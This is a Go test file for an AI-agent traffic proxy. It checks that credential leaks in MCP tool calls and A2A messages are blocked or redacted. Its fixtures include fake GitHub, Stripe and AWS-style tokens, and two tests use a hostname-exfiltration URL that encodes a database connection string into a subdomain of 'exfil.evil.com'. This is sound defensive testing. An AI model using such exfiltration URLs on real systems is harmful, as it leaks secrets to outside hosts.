// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package mcp

import (
	"bytes"
	"context"
	"net/http"
	"strings"
	"testing"

	"github.com/luckyPipewrench/pipelock/internal/capture"
	"github.com/luckyPipewrench/pipelock/internal/config"
	"github.com/luckyPipewrench/pipelock/internal/mcp/transport"
	"github.com/luckyPipewrench/pipelock/internal/redact"
	"github.com/luckyPipewrench/pipelock/internal/scanner"
)

// coreCredentialToken builds a value that trips the immutable "GitHub Token"
// core DLP pattern. It is assembled at runtime from split literals so gosec
// G101 does not flag a hardcoded credential.
func coreCredentialToken() string {
	return "ghp_" + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl"
}

// nonCoreSecretValue returns a non-core (Stripe Key) DLP credential. Warn, ask,
// adaptive-upgrade, and authority fixtures use it so they exercise the
// configured action path rather than the immutable core floor, which now
// hard-blocks core credentials regardless of the configured action.
func nonCoreSecretValue() string {
	return "sk_test_" + "4eC39HqLyjWDarjtT1zdp7dc"
}

// TestMCPInputCoreFloor_WarnActionStillBlocksCoreCredential proves the MCP
// input verdict hard-blocks a core-critical credential in a tools/call
// argument even when mcp_input_scanning.action is warn. The core floor cannot
// be suppressed by the configured action, matching the request-body floor.
func TestMCPInputCoreFloor_WarnActionStillBlocksCoreCredential(t *testing.T) {
	sc := testScannerWithAction(t, config.ActionWarn)
	token := coreCredentialToken()
	msg := []byte(`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"send","arguments":{"note":"` + token + `"}}}`)

	verdict := ScanRequest(context.Background(), msg, sc, config.ActionWarn, config.ActionBlock)
	if verdict.Clean {
		t.Fatalf("expected core credential to be detected, got clean verdict %+v", verdict)
	}
	got := inputVerdictEffectiveAction(verdict, config.ActionWarn)
	if got != config.ActionBlock {
		t.Fatalf("core credential under warn action: effective action = %q, want %q", got, config.ActionBlock)
	}
}

// TestMCPInputCoreFloor_WarnActionAllowsNonCoreConfigured confirms the floor is
// scoped: a non-core DLP finding under warn keeps following the configured
// warn action rather than hard-blocking.
func TestMCPInputCoreFloor_WarnActionAllowsNonCoreConfigured(t *testing.T) {
	// Stripe Key is a non-core built-in DLP pattern: it must keep following
	// the configured warn action, unlike the immutable core floor.
	sc := testScannerWithAction(t, config.ActionWarn)
	nonCore := "sk_test_" + "4eC39HqLyjWDarjtT1zdp7dc"
	msg := []byte(`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"send","arguments":{"note":"` + nonCore + `"}}}`)

	verdict := ScanRequest(context.Background(), msg, sc, config.ActionWarn, config.ActionBlock)
	if verdict.Clean {
		t.Fatal("expected non-core Stripe key to be detected")
	}
	for _, m := range verdict.Matches {
		if config.IsCoreDLPPatternName(m.PatternName) {
			t.Fatalf("test value unexpectedly matched a core pattern %q", m.PatternName)
		}
	}
	got := inputVerdictEffectiveAction(verdict, config.ActionWarn)
	if got != config.ActionWarn {
		t.Fatalf("non-core finding under warn: effective action = %q, want %q", got, config.ActionWarn)
	}
}

func TestMCPInputCoreFloor_DisabledHTTPScanningStillBlocksCoreOnly(t *testing.T) {
	sc := testScannerWithAction(t, config.ActionWarn)
	for _, tc := range []struct {
		name      string
		value     string
		wantBlock bool
		wantURL   bool
	}{
		{name: "core credential", value: coreCredentialToken(), wantBlock: true},
		{name: "core credential in tool argument URL", value: "https://api.vendor.example/callback?token=" + coreCredentialToken(), wantBlock: true},
		{name: "non-core credential", value: nonCoreSecretValue(), wantBlock: false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			msg := []byte(`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"send","arguments":{"note":"` + tc.value + `"}}}`)
			eval := EvaluateMCPInputGates(
				context.Background(), ParseMCPFrame(msg), msg, "session", MCPProxyOpts{Scanner: sc},
				config.ActionWarn, config.ActionBlock, false,
			)
			gotBlock := eval.ContentVerdict.Action == config.ActionBlock
			if gotBlock != tc.wantBlock {
				t.Fatalf("disabled input scanning: action = %q, wantBlock=%v, verdict=%+v", eval.ContentVerdict.Action, tc.wantBlock, eval.ContentVerdict)
			}
			if gotURL := len(eval.ContentVerdict.URLFindings) > 0; gotURL != tc.wantURL {
				t.Fatalf("disabled input scanning: URL finding=%v, want %v, verdict=%+v", gotURL, tc.wantURL, eval.ContentVerdict)
			}
			if !tc.wantBlock && (!eval.ContentVerdict.Clean || len(eval.ContentVerdict.Matches) != 0 || len(eval.ContentVerdict.URLFindings) != 0) {
				t.Fatalf("disabled input scanning retained configurable findings: %+v", eval.ContentVerdict)
			}
		})
	}
}

func TestMCPInputCoreFloor_DisabledHTTPScanningBlocksCoreResourceURL(t *testing.T) {
	sc := testScannerWithAction(t, config.ActionWarn)
	msg := []byte(makeRequest(1, "resources/read", map[string]string{
		"uri": "https://api.vendor.example/callback?token=" + coreCredentialToken(),
	}))
	eval := EvaluateMCPInputGates(
		context.Background(), ParseMCPFrame(msg), msg, "session", MCPProxyOpts{Scanner: sc},
		config.ActionWarn, config.ActionBlock, false,
	)
	if eval.ContentVerdict.Action != config.ActionBlock || len(eval.ContentVerdict.URLFindings) == 0 {
		t.Fatalf("disabled input scanning forwarded core credential resource URL: %+v", eval.ContentVerdict)
	}
	if !scanner.IsCoreCriticalResult(eval.ContentVerdict.URLFindings[0]) {
		t.Fatalf("resource URL finding is not classified as core: %+v", eval.ContentVerdict.URLFindings)
	}
}

func TestMCPInputCoreFloor_DisabledHTTPScanningFailsClosedOnIncompleteFloorScan(t *testing.T) {
	sc := testScannerWithAction(t, config.ActionWarn)
	msg := []byte(`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"send","arguments":` + deepJSONObject("safe", 100) + `}}`)
	eval := EvaluateMCPInputGates(
		context.Background(), ParseMCPFrame(msg), msg, "session", MCPProxyOpts{Scanner: sc},
		config.ActionWarn, config.ActionBlock, false,
	)
	if eval.ContentVerdict.Clean || eval.ContentVerdict.Error == "" || inputVerdictEffectiveAction(eval.ContentVerdict, config.ActionWarn) != config.ActionBlock {
		t.Fatalf("incomplete disabled-mode floor scan did not fail closed: %+v", eval.ContentVerdict)
	}
}

func TestMCPInputCoreFloor_DisabledHTTPScanningBlocksHostnameExfil(t *testing.T) {
	sc := testScannerWithAction(t, config.ActionWarn)
	msg := []byte(`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"fetch","arguments":{"url":"https://706f7374677265733a2f2f757365723a70617373406462.exfil.evil.com/leak"}}}`)
	eval := EvaluateMCPInputGates(
		context.Background(), ParseMCPFrame(msg), msg, "session", MCPProxyOpts{Scanner: sc},
		config.ActionWarn, config.ActionBlock, false,
	)
	if eval.ContentVerdict.Clean || eval.ContentVerdict.Action != config.ActionBlock {
		t.Fatalf("disabled input scanning forwarded hostname exfiltration: %+v", eval.ContentVerdict)
	}
	if !scanner.ContainsHostnameExfilMatch(eval.ContentVerdict.Matches) &&
		(len(eval.ContentVerdict.URLFindings) == 0 || !scanner.IsHostnameExfilResult(eval.ContentVerdict.URLFindings[0])) {
		t.Fatalf("hostname-exfil evidence was not preserved: %+v", eval.ContentVerdict)
	}
}

// TestA2ACoreFloor_WarnActionStillBlocksCoreCredential proves the A2A body scan
// hard-blocks a core-critical credential regardless of a2a_scanning.action.
// This is the branch reached when request_body_scanning is disabled and A2A
// scanning carries the body floor.
func TestA2ACoreFloor_WarnActionStillBlocksCoreCredential(t *testing.T) {
	sc := testA2AScanner(t)
	cfg := config.Defaults().A2AScanning
	cfg.Enabled = true
	cfg.Action = config.ActionWarn
	token := coreCredentialToken()
	body := []byte(`{"message":{"parts":[{"text":"here is the token ` + token + `"}]}}`)

	result := ScanA2ARequestBody(context.Background(), body, sc, &cfg)
	if result.Clean {
		t.Fatalf("expected core credential to be detected, got clean result %+v", result)
	}
	if result.Action != config.ActionBlock {
		t.Fatalf("core credential under a2a warn action: result action = %q, want %q", result.Action, config.ActionBlock)
	}
}

// TestA2ACoreFloor_URLLeafWarnActionStillBlocksCoreCredential proves a core
// credential carried inside an A2A URL leaf (query value) hard-blocks even
// when a2a_scanning.action is warn. Before the fix the FieldURL branch routed
// the core-DLP URL result through the configured action (warn) because it only
// forced block on structural hostname-exfil, so a core credential in a URL was
// forwarded while the same credential in a text leaf blocked.
func TestA2ACoreFloor_URLLeafWarnActionStillBlocksCoreCredential(t *testing.T) {
	sc := testA2AScanner(t)
	cfg := config.Defaults().A2AScanning
	cfg.Enabled = true
	cfg.Action = config.ActionWarn
	token := coreCredentialToken()
	body := []byte(`{"url":"https://agent.vendor.example/cb?token=` + token + `"}`)

	result := ScanA2ARequestBody(context.Background(), body, sc, &cfg)
	if result.Clean {
		t.Fatalf("expected core credential in URL to be detected, got clean %+v", result)
	}
	if result.Action != config.ActionBlock {
		t.Fatalf("core credential in A2A URL under warn: action = %q, want %q", result.Action, config.ActionBlock)
	}
}

// TestA2ACoreFloor_URLLeafNonCoreFollowsWarn proves the URL floor is scoped: a
// non-core (Stripe) credential in a URL leaf keeps following the configured
// warn action rather than hard-blocking, mirroring the non-core text path.
func TestA2ACoreFloor_URLLeafNonCoreFollowsWarn(t *testing.T) {
	sc := testA2AScanner(t)
	cfg := config.Defaults().A2AScanning
	cfg.Enabled = true
	cfg.Action = config.ActionWarn
	nonCore := nonCoreSecretValue()
	body := []byte(`{"url":"https://agent.vendor.example/cb?token=` + nonCore + `"}`)

	result := ScanA2ARequestBody(context.Background(), body, sc, &cfg)
	if result.Clean {
		t.Fatal("expected non-core credential in URL to be detected")
	}
	if result.Action != config.ActionWarn {
		t.Fatalf("non-core credential in A2A URL under warn: action = %q, want %q", result.Action, config.ActionWarn)
	}
}

// TestA2ACoreFloor_HeaderURIWarnActionStillBlocksCoreCredential proves the
// sibling A2A-Extensions header path applies the same immutable floor: a core
// credential in a header URI hard-blocks regardless of a2a_scanning.action.
func TestA2ACoreFloor_HeaderURIWarnActionStillBlocksCoreCredential(t *testing.T) {
	sc := testA2AScanner(t)
	cfg := config.Defaults().A2AScanning
	cfg.Enabled = true
	cfg.Action = config.ActionWarn
	token := coreCredentialToken()
	h := http.Header{}
	h.Set("A2A-Extensions", "https://agent.vendor.example/ext?token="+token)

	result := ScanA2AHeaders(context.Background(), h, sc, &cfg)
	if result.Clean {
		t.Fatal("expected core credential in header URI to be detected")
	}
	if result.Action != config.ActionBlock {
		t.Fatalf("core credential in A2A header under warn: action = %q, want %q", result.Action, config.ActionBlock)
	}
}

func TestA2ACoreFloor_HeaderURIWarnActionStillBlocksHostnameExfil(t *testing.T) {
	sc := testA2AScanner(t)
	cfg := config.Defaults().A2AScanning
	cfg.Enabled = true
	cfg.Action = config.ActionWarn
	h := http.Header{}
	h.Set("A2A-Extensions", "https://706f7374677265733a2f2f757365723a70617373406462.exfil.evil.com/extension")

	result := ScanA2AHeaders(context.Background(), h, sc, &cfg)
	if result.Clean || result.Action != config.ActionBlock {
		t.Fatalf("hostname-exfiltration header under warn did not hard-block: %+v", result)
	}
	if len(result.URLFindings) == 0 || !scanner.IsHostnameExfilResult(result.URLFindings[0]) {
		t.Fatalf("hostname-exfiltration header evidence was not preserved: %+v", result.URLFindings)
	}
}

// TestA2ACoreFloor_HeaderURINonCoreFollowsWarn proves the header floor is
// scoped: a non-core credential in a header URI follows the configured warn
// action.
func TestA2ACoreFloor_HeaderURINonCoreFollowsWarn(t *testing.T) {
	sc := testA2AScanner(t)
	cfg := config.Defaults().A2AScanning
	cfg.Enabled = true
	cfg.Action = config.ActionWarn
	nonCore := nonCoreSecretValue()
	h := http.Header{}
	h.Set("A2A-Extensions", "https://agent.vendor.example/ext?token="+nonCore)

	result := ScanA2AHeaders(context.Background(), h, sc, &cfg)
	if result.Clean {
		t.Fatal("expected non-core credential in header URI to be detected")
	}
	if result.Action != config.ActionWarn {
		t.Fatalf("non-core credential in A2A header under warn: action = %q, want %q", result.Action, config.ActionWarn)
	}
}

// dlpFindingsNamePattern reports whether any captured finding carries the given
// DLP pattern name, so a warn-evidence assertion can confirm the original match
// reached the capture surface.
func dlpFindingsNamePattern(findings []capture.Finding, name string) bool {
	for _, f := range findings {
		if f.PatternName == name {
			return true
		}
	}
	return false
}

// TestForwardScannedInput_RedactedCoreCredentialRecordsWarnEvidence proves the
// stdio evidence floor: when redaction fully scrubs a core credential under a
// warn action, the request forwards scrubbed AND the pre-redaction finding is
// still recorded as a warn -- the warn log names the core pattern with a
// redacted marker, the capture observer sees a warn DLP verdict naming the core
// pattern, and the request is NOT credited as a clean adaptive recovery. Before
// the evidence floor the post-redaction rescan was clean, so this took the
// all-clean path: no warn, no capture verdict, and a clean-recovery credit.
func TestForwardScannedInput_RedactedCoreCredentialRecordsWarnEvidence(t *testing.T) {
	sc := testInputScanner(t)
	secret := mcpRedactionSecret() // core AWS access key, fully scrubbed by the default matcher
	msg := makeRequest(1, methodToolsCall, map[string]any{
		"name":      "echo",
		"arguments": map[string]string{"prompt": "use " + secret + " to deploy"},
	})

	obs := &mcpCaptureMetadataObserver{got: make(chan capture.DLPVerdictRecord, 4)}
	cleanRecoveryCalls := 0
	rec := &mockRecoverer{
		cleanRecoverFunc: func(_ float64, _ int, _ func(int) bool) (bool, int, int) {
			cleanRecoveryCalls++
			return false, 0, 0
		},
	}
	adaptiveCfg := &config.AdaptiveEnforcement{Enabled: true, DecayPerCleanRequest: 0.5, CleanRequestsToDeescalate: 1}

	var serverBuf, logBuf bytes.Buffer
	blockedCh := make(chan BlockedRequest, 1)
	opts := buildTestOpts(sc, withRedaction(testRedactionMatcher()), withRec(rec), withAdaptive(adaptiveCfg))
	opts.CaptureObs = obs
	opts.Transport = transportMCPStdio

	ForwardScannedInput(
		transport.NewStdioReader(strings.NewReader(msg)),
		transport.NewStdioWriter(&serverBuf),
		&logBuf,
		config.ActionWarn,
		config.ActionBlock,
		blockedCh,
		nil,
		nil,
		opts,
	)

	if blocked, ok := <-blockedCh; ok {
		t.Fatalf("scrubbed core credential under warn must not block: %+v", blocked)
	}
	forwarded := strings.TrimSpace(serverBuf.String())
	if strings.Contains(forwarded, secret) {
		t.Fatalf("forwarded request leaked the core credential: %s", forwarded)
	}
	if !strings.Contains(forwarded, mcpPlaceholderAWS) {
		t.Fatalf("forwarded request missing aws-access-key placeholder: %s", forwarded)
	}

	// Evidence: the warn line names the core pattern and marks it redacted.
	if !strings.Contains(logBuf.String(), "warning") {
		t.Fatalf("expected a warn log line, got: %s", logBuf.String())
	}
	if !strings.Contains(logBuf.String(), "AWS Access ID") {
		t.Fatalf("warn log missing the core pattern name: %s", logBuf.String())
	}
	if !strings.Contains(logBuf.String(), redactedDLPMarker) {
		t.Fatalf("warn log missing the redacted marker: %s", logBuf.String())
	}

	// Evidence: the capture observer saw the DLP verdict as a warn naming the core pattern.
	select {
	case got := <-obs.got:
		if got.EffectiveAction != config.ActionWarn {
			t.Fatalf("captured DLP verdict action = %q, want warn", got.EffectiveAction)
		}
		if !dlpFindingsNamePattern(got.RawFindings, "AWS Access ID") {
			t.Fatalf("captured DLP verdict missing the core pattern, got %+v", got.RawFindings)
		}
	default:
		t.Fatal("expected a captured DLP verdict for the redacted core credential")
	}

	// Evidence: a scrubbed-credential request is NOT a clean recovery.
	if cleanRecoveryCalls != 0 {
		t.Fatalf("redacted-credential request credited clean recovery: calls = %d", cleanRecoveryCalls)
	}
	if rec.recordCleanCalls != 0 {
		t.Fatalf("redacted-credential request credited RecordClean: calls = %d", rec.recordCleanCalls)
	}
}

// TestScanHTTPInput_RedactedCoreCredentialRecordsWarnEvidence is the HTTP
// listener sibling of the stdio evidence test above: same fully-scrubbed core
// credential under warn, forwarded scrubbed, with the pre-redaction finding
// retained as a warn on the capture surface and no clean-recovery credit.
func TestScanHTTPInput_RedactedCoreCredentialRecordsWarnEvidence(t *testing.T) {
	sc := testScannerForHTTP(t)
	secret := mcpRedactionSecret()
	msg := []byte(`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"echo","arguments":{"prompt":"use ` + secret + ` to deploy"}}}`)

	obs := &mcpCaptureMetadataObserver{got: make(chan capture.DLPVerdictRecord, 4)}
	cleanRecoveryCalls := 0
	rec := &mockRecoverer{
		cleanRecoverFunc: func(_ float64, _ int, _ func(int) bool) (bool, int, int) {
			cleanRecoveryCalls++
			return false, 0, 0
		},
	}
	adaptiveCfg := &config.AdaptiveEnforcement{Enabled: true, DecayPerCleanRequest: 0.5, CleanRequestsToDeescalate: 1}

	var logBuf bytes.Buffer
	decision := scanHTTPInputDecision(msg, &logBuf, "", "", MCPProxyOpts{
		Scanner:       sc,
		InputCfg:      &InputScanConfig{Enabled: true, Action: config.ActionWarn, OnParseError: config.ActionBlock},
		RedactMatcher: testHTTPRedactionMatcher(),
		RedactLimits:  redact.DefaultLimits().ToLimits(),
		RedactProfile: "code",
		CaptureObs:    obs,
		Rec:           rec,
		AdaptiveCfg:   adaptiveCfg,
		Transport:     transportMCPHTTP,
	})

	if decision.Blocked != nil {
		t.Fatalf("scrubbed core credential under warn must forward, not block: %+v", decision.Blocked)
	}
	forwarded := string(decision.ForwardMessage)
	if strings.Contains(forwarded, secret) {
		t.Fatalf("forwarded request leaked the core credential: %s", forwarded)
	}
	if !strings.Contains(forwarded, mcpPlaceholderAWS) {
		t.Fatalf("forwarded request missing aws-access-key placeholder: %s", forwarded)
	}

	if !strings.Contains(logBuf.String(), "warning") {
		t.Fatalf("expected a warn log line, got: %s", logBuf.String())
	}
	if !strings.Contains(logBuf.String(), "AWS Access ID") {
		t.Fatalf("warn log missing the core pattern name: %s", logBuf.String())
	}
	if !strings.Contains(logBuf.String(), redactedDLPMarker) {
		t.Fatalf("warn log missing the redacted marker: %s", logBuf.String())
	}

	select {
	case got := <-obs.got:
		if got.EffectiveAction != config.ActionWarn {
			t.Fatalf("captured DLP verdict action = %q, want warn", got.EffectiveAction)
		}
		if !dlpFindingsNamePattern(got.RawFindings, "AWS Access ID") {
			t.Fatalf("captured DLP verdict missing the core pattern, got %+v", got.RawFindings)
		}
	default:
		t.Fatal("expected a captured DLP verdict for the redacted core credential")
	}

	if cleanRecoveryCalls != 0 {
		t.Fatalf("redacted-credential request credited clean recovery: calls = %d", cleanRecoveryCalls)
	}
	if rec.recordCleanCalls != 0 {
		t.Fatalf("redacted-credential request credited RecordClean: calls = %d", rec.recordCleanCalls)
	}
}

// A non-core finding on an earlier leaf must not shadow the split-secret pass:
// a core credential split across two JSON values still reaches the immutable
// floor and the whole body blocks under a2a_scanning.action: warn.
func TestA2ACoreFloor_SplitCoreCredentialBlocksAfterNonCoreFinding(t *testing.T) {
	sc := testA2AScanner(t)
	cfg := config.Defaults().A2AScanning
	cfg.Enabled = true
	cfg.Action = config.ActionWarn
	token := coreCredentialToken()
	head, tail := token[:12], token[12:]
	body := []byte(`{"message":{"parts":[{"text":"non-core ` + nonCoreSecretValue() + `"},{"text":"` + head + `"},{"text":"` + tail + `"}]}}`)

	result := ScanA2ARequestBody(context.Background(), body, sc, &cfg)
	if result.Clean {
		t.Fatalf("expected findings, got clean result %+v", result)
	}
	if result.Action != config.ActionBlock {
		t.Fatalf("split core credential after a non-core finding: action = %q, want %q (findings %+v)", result.Action, config.ActionBlock, result.DLPFindings)
	}
	seen := make(map[string]struct{}, len(result.DLPFindings))
	for _, finding := range result.DLPFindings {
		key := finding.PatternName + "\x00" + finding.Encoded
		if _, ok := seen[key]; ok {
			t.Fatalf("duplicate A2A DLP finding across leaf and raw passes: %+v", finding)
		}
		seen[key] = struct{}{}
	}
}

func TestAppendUniqueA2ADLPFindingsRetainsNewNonCoreRawMatch(t *testing.T) {
	existing := []scanner.TextDLPMatch{{PatternName: "earlier", Encoded: "plain"}}
	incoming := []scanner.TextDLPMatch{
		{PatternName: "earlier", Encoded: "plain"},
		{PatternName: "raw-only-non-core", Encoded: "plain"},
	}

	got := appendUniqueA2ADLPFindings(existing, incoming)
	if len(got) != 2 {
		t.Fatalf("deduplicated findings = %+v, want earlier and raw-only findings", got)
	}
	if got[1].PatternName != "raw-only-non-core" {
		t.Fatalf("second finding = %+v, want retained raw-only non-core finding", got[1])
	}
}
